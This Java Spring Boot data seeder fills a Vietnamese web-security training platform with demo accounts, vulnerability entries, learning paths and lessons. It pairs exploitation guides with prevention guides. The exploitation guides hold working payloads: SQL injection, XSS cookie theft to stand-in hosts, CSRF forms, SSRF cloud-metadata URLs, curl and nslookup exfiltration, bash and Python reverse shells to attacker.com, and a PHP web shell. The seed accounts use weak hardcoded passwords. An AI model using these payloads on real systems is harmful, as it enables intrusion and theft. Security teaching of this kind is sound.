package com.sechub.seed;

import com.sechub.entity.*;
import com.sechub.repository.*;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.CommandLineRunner;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;

import java.util.List;

@Component
public class DataSeeder implements CommandLineRunner {

    private static final Logger log = LoggerFactory.getLogger(DataSeeder.class);

    private final UserRepository userRepository;
    private final VulnerabilityRepository vulnerabilityRepository;
    private final LearningPathRepository learningPathRepository;
    private final LessonRepository lessonRepository;
    private final LabRepository labRepository;
    private final PasswordEncoder passwordEncoder;

    public DataSeeder(UserRepository userRepository,
                      VulnerabilityRepository vulnerabilityRepository,
                      LearningPathRepository learningPathRepository,
                      LessonRepository lessonRepository,
                      LabRepository labRepository,
                      PasswordEncoder passwordEncoder) {
        this.userRepository = userRepository;
        this.vulnerabilityRepository = vulnerabilityRepository;
        this.learningPathRepository = learningPathRepository;
        this.lessonRepository = lessonRepository;
        this.labRepository = labRepository;
        this.passwordEncoder = passwordEncoder;
    }

    @Override
    @Transactional
    public void run(String... args) {
        if (userRepository.count() > 0) {
            log.info("Database already seeded. Skipping...");
            return;
        }

        log.info("Seeding database with initial data...");

        seedUsers();
        List<Vulnerability> vulnerabilities = seedVulnerabilities();
        List<LearningPath> paths = seedLearningPaths();
        seedLessons(paths, vulnerabilities);
        seedLabs(vulnerabilities);

        log.info("Database seeding completed successfully!");
    }

    private void seedUsers() {
        userRepository.saveAll(List.of(
            User.builder()
                .username("admin")
                .email("admin@sechub.vn")
                .passwordHash(passwordEncoder.encode("admin123"))
                .role(User.Role.ADMIN)
                .avatarUrl("https://api.dicebear.com/7.x/avataaars/svg?seed=admin")
                .build(),
            User.builder()
                .username("instructor")
                .email("instructor@sechub.vn")
                .passwordHash(passwordEncoder.encode("instructor123"))
                .role(User.Role.INSTRUCTOR)
                .avatarUrl("https://api.dicebear.com/7.x/avataaars/svg?seed=instructor")
                .build(),
            User.builder()
                .username("student")
                .email("student@sechub.vn")
                .passwordHash(passwordEncoder.encode("student123"))
                .role(User.Role.USER)
                .avatarUrl("https://api.dicebear.com/7.x/avataaars/svg?seed=student")
                .build()
        ));
        log.info("  ✓ Users seeded");
    }

    private List<Vulnerability> seedVulnerabilities() {
        List<Vulnerability> vulns = vulnerabilityRepository.saveAll(List.of(
            // 1. SQL Injection
            Vulnerability.builder()
                .slug("sql-injection")
                .name("SQL Injection")
                .icon("database")
                .severity(Vulnerability.Severity.CRITICAL)
                .sortOrder(1)
                .description("SQL Injection (SQLi) là một kỹ thuật tấn công cho phép kẻ tấn công chèn hoặc thao túng các truy vấn SQL thông qua dữ liệu đầu vào của ứng dụng. Đây là một trong những lỗ hổng bảo mật web phổ biến và nguy hiểm nhất, nằm trong Top 10 OWASP.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác SQL Injection

                    ## 1. Phát hiện lỗ hổng
                    Thử chèn ký tự đặc biệt vào các trường input:
                    - Thêm dấu nháy đơn `'` vào cuối giá trị
                    - Sử dụng `" OR 1=1 --` trong trường đăng nhập
                    - Quan sát thông báo lỗi từ database

                    ## 2. Các loại SQL Injection
                    ### In-band SQLi
                    ```sql
                    ' UNION SELECT username, password FROM users --
                    ```

                    ### Blind SQLi
                    ```sql
                    ' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') > 0 --
                    ```

                    ### Time-based Blind SQLi
                    ```sql
                    ' AND IF(1=1, SLEEP(5), 0) --
                    ```

                    ## 3. Khai thác nâng cao
                    - Trích xuất tên bảng: `' UNION SELECT table_name, NULL FROM information_schema.tables --`
                    - Trích xuất cột: `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --`
                    - Đọc file hệ thống: `' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --`

                    ## 4. Công cụ hỗ trợ
                    - **sqlmap**: Tự động phát hiện và khai thác SQLi
                    - **Burp Suite**: Chặn và sửa đổi request
                    - **Havij**: Công cụ SQLi tự động
                    """)
                .preventionGuide("""
                    # Phòng chống SQL Injection

                    ## 1. Sử dụng Prepared Statements (Parameterized Queries)
                    ```java
                    // ❌ Sai - Dễ bị tấn công
                    String query = "SELECT * FROM users WHERE username='" + username + "'";

                    // ✅ Đúng - An toàn
                    PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username=?");
                    stmt.setString(1, username);
                    ```

                    ## 2. Sử dụng ORM (Object-Relational Mapping)
                    Spring Data JPA, Hibernate tự động xử lý parameterized queries.

                    ## 3. Xác thực và làm sạch đầu vào
                    - Whitelist các ký tự được phép
                    - Escape các ký tự đặc biệt
                    - Giới hạn độ dài input

                    ## 4. Nguyên tắc quyền tối thiểu
                    - Database user chỉ có quyền cần thiết
                    - Không sử dụng tài khoản root/sa cho ứng dụng

                    ## 5. Web Application Firewall (WAF)
                    - ModSecurity, AWS WAF, Cloudflare WAF
                    """)
                .build(),

            // 2. XSS
            Vulnerability.builder()
                .slug("xss")
                .name("Cross-Site Scripting (XSS)")
                .icon("code")
                .severity(Vulnerability.Severity.HIGH)
                .sortOrder(2)
                .description("Cross-Site Scripting (XSS) là lỗ hổng cho phép kẻ tấn công chèn mã JavaScript độc hại vào trang web, được thực thi trong trình duyệt của nạn nhân. XSS có thể đánh cắp cookie, session, thông tin cá nhân hoặc thực hiện hành động thay mặt người dùng.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác XSS

                    ## 1. Reflected XSS
                    Mã độc được chèn qua URL và phản hồi ngay:
                    ```html
                    https://target.com/search?q=<script>alert('XSS')</script>
                    ```

                    ## 2. Stored XSS
                    Mã độc được lưu trữ trên server (comment, profile):
                    ```html
                    <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
                    ```

                    ## 3. DOM-based XSS
                    Khai thác thông qua DOM manipulation:
                    ```javascript
                    // URL: https://target.com/#<img src=x onerror=alert(1)>
                    document.getElementById('output').innerHTML = location.hash.slice(1);
                    ```

                    ## 4. Bypass Filter
                    - Sử dụng event handlers: `<svg onload=alert(1)>`
                    - Encoding: `<script>alert(String.fromCharCode(88,83,83))</script>`
                    - Polyglot: `jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//`

                    ## 5. Đánh cắp thông tin
                    ```javascript
                    new Image().src = "https://attacker.com/log?cookie=" + document.cookie;
                    ```
                    """)
                .preventionGuide("""
                    # Phòng chống XSS

                    ## 1. Mã hóa đầu ra (Output Encoding)
                    ```java
                    // HTML encoding
                    String safe = HtmlUtils.htmlEscape(userInput);

                    // JavaScript encoding
                    String safe = JavaScriptUtils.javaScriptEscape(userInput);
                    ```

                    ## 2. Content Security Policy (CSP)
                    ```
                    Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
                    ```

                    ## 3. HttpOnly & Secure Cookie Flags
                    ```java
                    cookie.setHttpOnly(true);
                    cookie.setSecure(true);
                    cookie.setSameSite("Strict");
                    ```

                    ## 4. Sử dụng template engine an toàn
                    Thymeleaf, React tự động escape HTML mặc định.

                    ## 5. Xác thực đầu vào
                    - Whitelist HTML tags được phép
                    - Sử dụng thư viện sanitize như OWASP Java HTML Sanitizer
                    """)
                .build(),

            // 3. CSRF
            Vulnerability.builder()
                .slug("csrf")
                .name("Cross-Site Request Forgery (CSRF)")
                .icon("shuffle")
                .severity(Vulnerability.Severity.MEDIUM)
                .sortOrder(3)
                .description("CSRF là kỹ thuật tấn công khiến người dùng đã xác thực thực hiện các hành động không mong muốn trên ứng dụng web mà họ đang đăng nhập. Kẻ tấn công lợi dụng cookie/session hợp lệ của nạn nhân để gửi request giả mạo.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác CSRF

                    ## 1. CSRF cơ bản với form ẩn
                    ```html
                    <form action="https://bank.com/transfer" method="POST" id="csrf-form">
                        <input type="hidden" name="to" value="attacker_account">
                        <input type="hidden" name="amount" value="1000000">
                    </form>
                    <script>document.getElementById('csrf-form').submit();</script>
                    ```

                    ## 2. CSRF với GET request
                    ```html
                    <img src="https://bank.com/transfer?to=attacker&amount=1000000">
                    ```

                    ## 3. CSRF với AJAX (nếu CORS cho phép)
                    ```javascript
                    fetch('https://target.com/api/change-email', {
                        method: 'POST',
                        credentials: 'include',
                        body: JSON.stringify({ email: 'attacker@evil.com' })
                    });
                    ```

                    ## 4. Bypass token yếu
                    - Token có thể đoán được
                    - Token không thay đổi giữa các session
                    - Token không được validate ở server
                    """)
                .preventionGuide("""
                    # Phòng chống CSRF

                    ## 1. CSRF Token
                    ```java
                    // Spring Security tự động thêm CSRF token
                    // Trong form:
                    <input type="hidden" name="_csrf" th:value="${_csrf.token}">
                    ```

                    ## 2. SameSite Cookie Attribute
                    ```
                    Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
                    ```

                    ## 3. Double Submit Cookie Pattern
                    Gửi token trong cả cookie và request header.

                    ## 4. Kiểm tra Origin/Referer Header
                    ```java
                    String origin = request.getHeader("Origin");
                    if (!allowedOrigins.contains(origin)) {
                        throw new SecurityException("Invalid origin");
                    }
                    ```

                    ## 5. Yêu cầu xác thực lại cho hành động nhạy cảm
                    Nhập lại mật khẩu khi thay đổi email, mật khẩu.
                    """)
                .build(),

            // 4. IDOR
            Vulnerability.builder()
                .slug("idor")
                .name("Insecure Direct Object Reference (IDOR)")
                .icon("key")
                .severity(Vulnerability.Severity.HIGH)
                .sortOrder(4)
                .description("IDOR xảy ra khi ứng dụng sử dụng tham chiếu trực tiếp đến đối tượng nội bộ (như ID trong database) mà không kiểm tra quyền truy cập. Kẻ tấn công có thể thay đổi ID trong request để truy cập dữ liệu của người dùng khác.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác IDOR

                    ## 1. Thay đổi ID trong URL
                    ```
                    GET /api/users/123/profile → Thông tin của user 123
                    GET /api/users/124/profile → Thông tin của user 124 (không phải của bạn!)
                    ```

                    ## 2. Thay đổi ID trong body request
                    ```json
                    POST /api/orders
                    {"user_id": 124, "product_id": 1}
                    ```

                    ## 3. IDOR trong file download
                    ```
                    GET /api/documents/download?file=report_123.pdf
                    GET /api/documents/download?file=report_124.pdf
                    ```

                    ## 4. Enumeration
                    - Brute-force ID tuần tự (1, 2, 3, ...)
                    - Sử dụng Burp Intruder để tự động hóa
                    - Kiểm tra các endpoint khác nhau với cùng ID

                    ## 5. Horizontal vs Vertical Privilege Escalation
                    - **Horizontal**: Truy cập dữ liệu của user cùng role
                    - **Vertical**: Truy cập chức năng admin
                    """)
                .preventionGuide("""
                    # Phòng chống IDOR

                    ## 1. Kiểm tra quyền truy cập ở mọi endpoint
                    ```java
                    @GetMapping("/orders/{id}")
                    public Order getOrder(@PathVariable UUID id, @AuthenticationPrincipal User user) {
                        Order order = orderService.findById(id);
                        if (!order.getUserId().equals(user.getId())) {
                            throw new AccessDeniedException("Không có quyền truy cập");
                        }
                        return order;
                    }
                    ```

                    ## 2. Sử dụng UUID thay vì ID tuần tự
                    UUID khó đoán hơn ID auto-increment.

                    ## 3. Indirect Reference Maps
                    Ánh xạ ID nội bộ sang ID ngẫu nhiên cho từng session.

                    ## 4. Row-level Security
                    Kiểm tra quyền sở hữu dữ liệu ở tầng service/repository.

                    ## 5. Audit Logging
                    Ghi log mọi truy cập bất thường để phát hiện tấn công.
                    """)
                .build(),

            // 5. SSRF
            Vulnerability.builder()
                .slug("ssrf")
                .name("Server-Side Request Forgery (SSRF)")
                .icon("server")
                .severity(Vulnerability.Severity.CRITICAL)
                .sortOrder(5)
                .description("SSRF cho phép kẻ tấn công khiến server thực hiện các HTTP request đến địa chỉ do kẻ tấn công chỉ định. Điều này có thể được sử dụng để truy cập hệ thống nội bộ, đọc metadata cloud, hoặc tấn công các dịch vụ sau firewall.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác SSRF

                    ## 1. SSRF cơ bản
                    ```
                    POST /api/fetch-url
                    {"url": "http://internal-server:8080/admin"}
                    ```

                    ## 2. Truy cập Cloud Metadata
                    ```
                    # AWS
                    http://169.254.169.254/latest/meta-data/iam/security-credentials/

                    # GCP
                    http://metadata.google.internal/computeMetadata/v1/

                    # Azure
                    http://169.254.169.254/metadata/instance?api-version=2021-02-01
                    ```

                    ## 3. Quét mạng nội bộ
                    ```
                    http://192.168.1.1:22    → SSH
                    http://192.168.1.1:3306  → MySQL
                    http://192.168.1.1:6379  → Redis
                    ```

                    ## 4. Bypass Filter
                    - Sử dụng IP dạng decimal: `http://2130706433` (127.0.0.1)
                    - URL encoding: `http://127.0.0.1` → `http://127%2E0%2E0%2E1`
                    - DNS rebinding: Sử dụng domain trỏ về 127.0.0.1
                    - IPv6: `http://[::1]/`

                    ## 5. Protocol smuggling
                    ```
                    gopher://internal:6379/_SET%20key%20value
                    dict://internal:6379/SET:key:value
                    ```
                    """)
                .preventionGuide("""
                    # Phòng chống SSRF

                    ## 1. Whitelist URL/IP được phép
                    ```java
                    List<String> allowedHosts = List.of("api.example.com", "cdn.example.com");
                    if (!allowedHosts.contains(new URL(url).getHost())) {
                        throw new SecurityException("Host không được phép");
                    }
                    ```

                    ## 2. Chặn IP nội bộ
                    ```java
                    InetAddress address = InetAddress.getByName(host);
                    if (address.isLoopbackAddress() || address.isSiteLocalAddress()) {
                        throw new SecurityException("Không thể truy cập địa chỉ nội bộ");
                    }
                    ```

                    ## 3. Vô hiệu hóa redirect
                    Không follow HTTP redirect tự động.

                    ## 4. Sử dụng proxy riêng
                    Route outbound request qua proxy với whitelist.

                    ## 5. Network Segmentation
                    Tách biệt mạng giữa web server và internal services.
                    """)
                .build(),

            // 6. Command Injection
            Vulnerability.builder()
                .slug("command-injection")
                .name("Command Injection")
                .icon("terminal")
                .severity(Vulnerability.Severity.CRITICAL)
                .sortOrder(6)
                .description("Command Injection (OS Command Injection) xảy ra khi ứng dụng truyền dữ liệu người dùng không an toàn vào shell command. Kẻ tấn công có thể thực thi lệnh hệ điều hành tùy ý trên server, dẫn đến toàn quyền kiểm soát hệ thống.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác Command Injection

                    ## 1. Injection cơ bản
                    ```
                    # Ứng dụng thực hiện: ping <user_input>
                    Input: 127.0.0.1; cat /etc/passwd
                    Input: 127.0.0.1 && whoami
                    Input: 127.0.0.1 | id
                    ```

                    ## 2. Các ký tự chèn lệnh
                    - `;` - Chạy lệnh tiếp theo
                    - `&&` - Chạy nếu lệnh trước thành công
                    - `||` - Chạy nếu lệnh trước thất bại
                    - `|` - Pipe output
                    - `` `command` `` - Command substitution
                    - `$(command)` - Command substitution

                    ## 3. Blind Command Injection
                    ```
                    # Time-based
                    127.0.0.1; sleep 10

                    # Out-of-band
                    127.0.0.1; curl https://attacker.com/$(whoami)
                    127.0.0.1; nslookup $(cat /etc/hostname).attacker.com
                    ```

                    ## 4. Reverse Shell
                    ```bash
                    ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
                    ; python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
                    ```

                    ## 5. Bypass Filter
                    - Sử dụng `$IFS` thay cho khoảng trắng
                    - Encoding: `$(printf '\\x63\\x61\\x74') /etc/passwd`
                    - Wildcard: `cat /etc/pass??`
                    """)
                .preventionGuide("""
                    # Phòng chống Command Injection

                    ## 1. KHÔNG sử dụng system commands
                    ```java
                    // ❌ Tuyệt đối tránh
                    Runtime.getRuntime().exec("ping " + userInput);

                    // ✅ Sử dụng thư viện Java thay thế
                    InetAddress.getByName(userInput).isReachable(5000);
                    ```

                    ## 2. Nếu bắt buộc dùng system command
                    ```java
                    // Sử dụng ProcessBuilder với arguments tách biệt
                    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", sanitizedHost);
                    pb.redirectErrorStream(true);
                    ```

                    ## 3. Whitelist input
                    ```java
                    if (!userInput.matches("^[a-zA-Z0-9.-]+$")) {
                        throw new BadRequestException("Input không hợp lệ");
                    }
                    ```

                    ## 4. Chạy với quyền tối thiểu
                    Ứng dụng không nên chạy với quyền root.

                    ## 5. Sandbox/Container
                    Chạy ứng dụng trong Docker container với hạn chế quyền.
                    """)
                .build(),

            // 7. File Upload
            Vulnerability.builder()
                .slug("file-upload")
                .name("Unrestricted File Upload")
                .icon("upload")
                .severity(Vulnerability.Severity.HIGH)
                .sortOrder(7)
                .description("Lỗ hổng File Upload xảy ra khi ứng dụng cho phép người dùng tải lên file mà không kiểm tra đúng cách. Kẻ tấn công có thể tải lên web shell, malware, hoặc file độc hại để chiếm quyền kiểm soát server.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác File Upload

                    ## 1. Upload Web Shell
                    ```php
                    <?php system($_GET['cmd']); ?>
                    ```
                    Truy cập: `https://target.com/uploads/shell.php?cmd=id`

                    ## 2. Bypass kiểm tra extension
                    - Double extension: `shell.php.jpg`
                    - Null byte: `shell.php%00.jpg`
                    - Case: `shell.pHp`
                    - Alternative ext: `.php5`, `.phtml`, `.phar`

                    ## 3. Bypass Content-Type check
                    ```
                    Content-Type: image/jpeg
                    (nhưng nội dung file là PHP code)
                    ```

                    ## 4. Bypass Magic Bytes check
                    ```
                    GIF89a
                    <?php system($_GET['cmd']); ?>
                    ```

                    ## 5. SVG XSS
                    ```xml
                    <?xml version="1.0" encoding="UTF-8"?>
                    <svg xmlns="http://www.w3.org/2000/svg">
                        <script>alert(document.cookie)</script>
                    </svg>
                    ```

                    ## 6. Overwrite system files
                    ```
                    Filename: ../../../etc/crontab
                    Filename: ../../../../var/www/html/.htaccess
                    ```
                    """)
                .preventionGuide("""
                    # Phòng chống File Upload

                    ## 1. Whitelist extension
                    ```java
                    List<String> allowedExtensions = List.of("jpg", "jpeg", "png", "gif", "pdf");
                    String ext = FilenameUtils.getExtension(file.getOriginalFilename()).toLowerCase();
                    if (!allowedExtensions.contains(ext)) {
                        throw new BadRequestException("Loại file không được phép");
                    }
                    ```

                    ## 2. Kiểm tra Content-Type và Magic Bytes
                    ```java
                    String mimeType = new Tika().detect(file.getInputStream());
                    if (!mimeType.startsWith("image/")) {
                        throw new BadRequestException("File phải là hình ảnh");
                    }
                    ```

                    ## 3. Đổi tên file
                    ```java
                    String newFilename = UUID.randomUUID() + "." + ext;
                    ```

                    ## 4. Lưu file ngoài webroot
                    Không cho phép truy cập trực tiếp file uploaded.

                    ## 5. Giới hạn kích thước file
                    ```properties
                    spring.servlet.multipart.max-file-size=5MB
                    ```

                    ## 6. Quét virus
                    Sử dụng ClamAV hoặc dịch vụ antivirus.
                    """)
                .build(),

            // 8. Authentication Bypass
            Vulnerability.builder()
                .slug("auth-bypass")
                .name("Authentication Bypass")
                .icon("unlock")
                .severity(Vulnerability.Severity.CRITICAL)
                .sortOrder(8)
                .description("Authentication Bypass là các kỹ thuật vượt qua cơ chế xác thực của ứng dụng mà không cần thông tin đăng nhập hợp lệ. Bao gồm lỗi logic, token prediction, default credentials, và nhiều phương pháp khác.")
                .exploitationGuide("""
                    # Hướng dẫn khai thác Authentication Bypass

                    ## 1. Default Credentials
                    ```
                    admin:admin
                    admin:password
                    root:root
                    test:test
                    ```

                    ## 2. SQL Injection trong login form
                    ```
                    Username: admin' --
                    Password: anything
                    ```

                    ## 3. JWT Manipulation
                    ```json
                    // Thay đổi algorithm sang "none"
                    {"alg": "none", "typ": "JWT"}

                    // Thay đổi role
                    {"sub": "user", "role": "admin"}
                    ```

                    ## 4. Password Reset Flaws
                    - Token reset dễ đoán
                    - Token không hết hạn
                    - Host header injection trong email reset

                    ## 5. Session Fixation
                    ```
                    1. Lấy session ID: JSESSIONID=abc123
                    2. Gửi link cho nạn nhân: https://target.com?JSESSIONID=abc123
                    3. Nạn nhân đăng nhập → Session abc123 giờ đã xác thực
                    ```

                    ## 6. Forced Browsing
                    ```
                    Truy cập trực tiếp: /admin/dashboard
                    Bỏ qua middleware: /Admin/Dashboard (case sensitivity)
                    Path traversal: /user/../admin/dashboard
                    ```

                    ## 7. Brute Force
                    Sử dụng Hydra, Burp Intruder để thử nhiều mật khẩu.
                    """)
                .preventionGuide("""
                    # Phòng chống Authentication Bypass

                    ## 1. Multi-Factor Authentication (MFA)
                    Yêu cầu OTP qua SMS, email, hoặc authenticator app.

                    ## 2. Rate Limiting
                    ```java
                    @RateLimiter(name = "loginLimiter", fallbackMethod = "loginRateLimited")
                    public AuthResponse login(AuthRequest request) { ... }
                    ```

                    ## 3. Account Lockout
                    Khóa tài khoản sau 5 lần đăng nhập thất bại.

                    ## 4. JWT Best Practices
                    ```java
                    // Sử dụng RS256 thay vì HS256
                    // Validate algorithm ở server
                    // Thời hạn token ngắn (15 phút)
                    // Sử dụng refresh token
                    ```

                    ## 5. Session Management
                    - Regenerate session ID sau khi đăng nhập
                    - HttpOnly, Secure, SameSite cookie flags
                    - Session timeout hợp lý

                    ## 6. Password Policy
                    - Tối thiểu 8 ký tự, bao gồm chữ hoa, chữ thường, số, ký tự đặc biệt
                    - Kiểm tra mật khẩu yếu với danh sách phổ biến
                    - Sử dụng bcrypt/argon2 để hash

                    ## 7. Logging & Monitoring
                    Ghi log mọi lần đăng nhập thất bại, cảnh báo bất thường.
                    """)
                .build()
        ));

        log.info("  ✓ {} Vulnerabilities seeded", vulns.size());
        return vulns;
    }

    private List<LearningPath> seedLearningPaths() {
        List<LearningPath> paths = learningPathRepository.saveAll(List.of(
            LearningPath.builder()
                .title("Nhập môn Bảo mật Web")
                .description("Lộ trình dành cho người mới bắt đầu. Tìm hiểu các khái niệm cơ bản về bảo mật web, các loại tấn công phổ biến, và cách phòng chống. Bạn sẽ học cách tư duy như một hacker để bảo vệ ứng dụng tốt hơn.")
                .difficulty(LearningPath.Difficulty.BEGINNER)
                .estimatedHours(20)
                .sortOrder(1)
                .build(),
            LearningPath.builder()
                .title("Kiểm thử xâm nhập Web nâng cao")
                .description("Lộ trình trung cấp cho những ai đã nắm vững kiến thức cơ bản. Đi sâu vào các kỹ thuật khai thác phức tạp, bypass security controls, và sử dụng các công cụ chuyên nghiệp như Burp Suite, sqlmap.")
                .difficulty(LearningPath.Difficulty.INTERMEDIATE)
                .estimatedHours(40)
                .sortOrder(2)
                .build(),
            LearningPath.builder()
                .title("Chuyên gia Pentest & Bug Bounty")
                .description("Lộ trình nâng cao dành cho những ai muốn trở thành pentester chuyên nghiệp hoặc tham gia bug bounty. Bao gồm các kỹ thuật tấn công phức tạp, chuỗi tấn công (attack chains), và phương pháp luận kiểm thử.")
                .difficulty(LearningPath.Difficulty.ADVANCED)
                .estimatedHours(60)
                .sortOrder(3)
                .build()
        ));

        log.info("  ✓ {} Learning Paths seeded", paths.size());
        return paths;
    }

    private void seedLessons(List<LearningPath> paths, List<Vulnerability> vulns) {
        LearningPath beginner = paths.get(0);
        LearningPath intermediate = paths.get(1);
        LearningPath advanced = paths.get(2);

        Vulnerability sqli = vulns.get(0);
        Vulnerability xss = vulns.get(1);
        Vulnerability csrf = vulns.get(2);
        Vulnerability idor = vulns.get(3);
        Vulnerability ssrf = vulns.get(4);
        Vulnerability cmdi = vulns.get(5);
        Vulnerability fileUpload = vulns.get(6);
        Vulnerability authBypass = vulns.get(7);

        // === BEGINNER PATH LESSONS ===
        List<Lesson> beginnerLessons = lessonRepository.saveAll(List.of(
            Lesson.builder()
                .learningPath(beginner)
                .title("Giới thiệu về Bảo mật Web")
                .sortOrder(1)
                .contentMarkdown("""
                    # Giới thiệu về Bảo mật Web

                    ## Bảo mật web là gì?
                    Bảo mật web (Web Security) là tập hợp các biện pháp, quy trình và công nghệ nhằm bảo vệ các ứng dụng web, website, và dịch vụ web khỏi các cuộc tấn công và mối đe dọa.

                    ## Tại sao bảo mật web quan trọng?
                    - **Bảo vệ dữ liệu người dùng**: Thông tin cá nhân, tài chính, y tế
                    - **Tuân thủ pháp luật**: GDPR, PCI DSS, Luật An ninh mạng Việt Nam
                    - **Bảo vệ uy tín**: Một vụ breach có thể hủy hoại thương hiệu
                    - **Ngăn chặn thiệt hại tài chính**: Chi phí trung bình của data breach là $4.45 triệu (2023)

                    ## OWASP Top 10
                    OWASP (Open Web Application Security Project) công bố danh sách 10 rủi ro bảo mật web phổ biến nhất:

                    1. **Broken Access Control** - Kiểm soát truy cập lỗi
                    2. **Cryptographic Failures** - Lỗi mã hóa
                    3. **Injection** - Các lỗ hổng injection (SQLi, XSS, ...)
                    4. **Insecure Design** - Thiết kế không an toàn
                    5. **Security Misconfiguration** - Cấu hình sai
                    6. **Vulnerable Components** - Thành phần có lỗ hổng
                    7. **Authentication Failures** - Lỗi xác thực
                    8. **Software Integrity Failures** - Lỗi toàn vẹn phần mềm
                    9. **Logging Failures** - Lỗi ghi log và giám sát
                    10. **SSRF** - Server-Side Request Forgery

                    ## Mindset của Pentester
                    > "Để bảo vệ một hệ thống, bạn phải hiểu cách tấn công nó."

                    Một pentester giỏi cần:
                    - Tư duy sáng tạo và kiên nhẫn
                    - Hiểu sâu về cách hoạt động của web
                    - Luôn cập nhật kiến thức mới
                    - Tuân thủ đạo đức và pháp luật
                    """)
                .build(),

            Lesson.builder()
                .learningPath(beginner)
                .title("HTTP và cách hoạt động của Web")
                .sortOrder(2)
                .contentMarkdown("""
                    # HTTP và cách hoạt động của Web

                    ## Mô hình Client-Server
                    Khi bạn truy cập một website:
                    1. **Trình duyệt** (Client) gửi HTTP Request đến Server
                    2. **Server** xử lý request và trả về HTTP Response
                    3. **Trình duyệt** render HTML/CSS/JS thành trang web

                    ## HTTP Methods
                    | Method | Mục đích | Ví dụ |
                    |--------|----------|-------|
                    | GET | Lấy dữ liệu | Xem trang web, API query |
                    | POST | Gửi dữ liệu | Đăng nhập, tạo bài viết |
                    | PUT | Cập nhật toàn bộ | Sửa profile |
                    | PATCH | Cập nhật một phần | Đổi email |
                    | DELETE | Xóa dữ liệu | Xóa bài viết |

                    ## HTTP Headers quan trọng
                    ```
                    # Request Headers
                    Host: www.example.com
                    User-Agent: Mozilla/5.0
                    Cookie: session=abc123
                    Authorization: Bearer eyJhbG...

                    # Response Headers
                    Content-Type: application/json
                    Set-Cookie: session=abc123; HttpOnly; Secure
                    X-Content-Type-Options: nosniff
                    Content-Security-Policy: default-src 'self'
                    ```

                    ## Status Codes
                    - **200 OK**: Thành công
                    - **301/302**: Redirect
                    - **400 Bad Request**: Lỗi từ client
                    - **401 Unauthorized**: Chưa xác thực
                    - **403 Forbidden**: Không có quyền
                    - **404 Not Found**: Không tìm thấy
                    - **500 Internal Server Error**: Lỗi server

                    ## Cookies & Sessions
                    - **Cookie**: Dữ liệu lưu ở browser, gửi kèm mỗi request
                    - **Session**: Dữ liệu lưu ở server, liên kết qua session ID trong cookie
                    - **JWT**: Token self-contained chứa thông tin user
                    """)
                .build(),

            Lesson.builder()
                .learningPath(beginner)
                .title("SQL Injection cho người mới bắt đầu")
                .sortOrder(3)
                .vulnerability(sqli)
                .contentMarkdown("""
                    # SQL Injection cho người mới bắt đầu

                    ## SQL là gì?
                    SQL (Structured Query Language) là ngôn ngữ để tương tác với database:
                    ```sql
                    SELECT * FROM users WHERE username = 'admin' AND password = '123456';
                    ```

                    ## SQL Injection là gì?
                    Khi ứng dụng ghép chuỗi input của người dùng trực tiếp vào câu SQL:

                    ```java
                    // Code dễ bị tấn công
                    String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
                    ```

                    Nếu người dùng nhập username: `admin' --`
                    ```sql
                    SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';
                    -- Phần sau -- bị comment, password bị bỏ qua!
                    ```

                    ## Thực hành cơ bản

                    ### Bước 1: Phát hiện
                    Thêm dấu `'` vào input. Nếu có lỗi SQL → có thể inject!

                    ### Bước 2: Xác nhận
                    ```
                    Input: ' OR '1'='1
                    → SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
                    → Điều kiện luôn đúng → Bypass đăng nhập!
                    ```

                    ### Bước 3: Khai thác
                    ```
                    ' UNION SELECT 1, username, password FROM users --
                    ```

                    ## Bài tập
                    Hãy thử khai thác SQL Injection trong lab thực hành!
                    """)
                .build(),

            Lesson.builder()
                .learningPath(beginner)
                .title("Cross-Site Scripting (XSS) cơ bản")
                .sortOrder(4)
                .vulnerability(xss)
                .contentMarkdown("""
                    # Cross-Site Scripting (XSS) cơ bản

                    ## XSS là gì?
                    XSS cho phép kẻ tấn công chèn mã JavaScript vào trang web, thực thi trong trình duyệt của người dùng khác.

                    ## 3 loại XSS

                    ### 1. Reflected XSS
                    Mã độc trong URL, phản hồi ngay:
                    ```
                    https://example.com/search?q=<script>alert('XSS')</script>
                    ```

                    ### 2. Stored XSS
                    Mã độc được lưu trong database (comment, profile):
                    ```html
                    <!-- Comment chứa mã độc -->
                    <script>document.location='https://evil.com/?c='+document.cookie</script>
                    ```

                    ### 3. DOM-based XSS
                    Mã độc thao tác DOM trực tiếp:
                    ```javascript
                    // Vulnerable code
                    document.getElementById('output').innerHTML = location.hash.slice(1);

                    // Attack URL
                    https://example.com/#<img src=x onerror=alert(1)>
                    ```

                    ## Tác hại của XSS
                    - 🍪 Đánh cắp cookie/session
                    - 👤 Đánh cắp thông tin cá nhân
                    - 🔑 Chiếm quyền tài khoản
                    - 🎣 Phishing (tạo form đăng nhập giả)
                    - 🔄 Lan truyền worm (Samy worm - MySpace 2005)

                    ## Phòng chống cơ bản
                    1. **HTML Encoding**: `<` → `&lt;`, `>` → `&gt;`
                    2. **CSP Header**: Chặn inline script
                    3. **HttpOnly Cookie**: JavaScript không đọc được cookie
                    """)
                .build(),

            Lesson.builder()
                .learningPath(beginner)
                .title("CSRF và bảo vệ form")
                .sortOrder(5)
                .vulnerability(csrf)
                .contentMarkdown("""
